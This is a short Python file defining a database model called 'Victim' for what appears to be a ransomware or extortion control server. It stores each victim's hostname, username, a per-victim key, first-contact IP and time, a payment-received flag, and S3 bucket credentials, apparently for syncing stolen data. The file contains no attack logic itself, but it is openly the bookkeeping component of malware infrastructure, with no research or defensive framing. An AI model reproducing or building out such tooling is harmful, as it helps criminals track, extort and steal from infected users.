from app import db
from datetime import datetime


def load_victim(victim_id):
    return Victim.query.get(int(victim_id))


class Victim(db.Model):
    victim_id = db.Column(db.Integer, primary_key=True)
    victim_hostname = db.Column(db.Text, nullable=False)
    victim_username = db.Column(db.Text, nullable=False)
    victim_key = db.Column(db.Text, default="HeheRandomKeyHere")
    date_firstContact = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    ip_firstContact = db.Column(db.Text, nullable=False)
    payment_received = db.Column(db.Boolean, nullable=False, default=0)
    s3_bucket = db.Column(db.Text, nullable=False)
    s3_access_key = db.Column(db.Text, nullable=False)
    s3_secret_key = db.Column(db.Text, nullable=False)
    sync_state = db.Column(db.Integer, nullable=False, default=0)
    archived = db.Column(db.Boolean, nullable=False, default=0)

    def __repr__(self):
        return f"Victim('{self.victim_id}', '{self.victim_hostname}', '{self.victim_username}', '{self.ip_firstContact}', '{self.date_firstContact}')"
